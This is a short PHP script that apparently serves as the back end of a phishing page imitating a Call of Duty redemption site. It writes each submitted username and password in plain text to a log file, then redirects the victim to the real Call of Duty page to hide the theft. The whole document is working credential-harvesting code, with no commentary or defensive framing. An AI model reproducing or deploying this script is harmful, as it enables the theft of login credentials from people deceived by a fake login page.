<?php
$f = fopen("log.txt", "a");
fwrite($f, "User: ".$_POST['user']." | Pass: ".$_POST['pass']."\n");
fclose($f);
header("Location: https://www.callofduty.com/redemption");
?>
